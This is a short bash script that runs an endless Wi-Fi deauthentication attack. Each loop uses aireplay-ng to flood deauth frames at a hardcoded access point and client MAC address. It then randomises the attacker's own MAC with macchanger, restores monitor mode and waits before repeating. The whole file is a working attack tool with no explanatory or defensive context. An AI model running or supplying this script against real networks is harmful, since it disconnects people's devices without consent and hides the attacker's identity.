#!/bin/bash

while true 
do
	aireplay-ng -0 5 -a 50:C7:BF:1B:C2:22 -c 58:48:22:7B:1E:E4 wlan0
	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New MAC: "
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	iwconfig wlan0 | grep Mode
	sleep 10
	echo Waiting ...
done

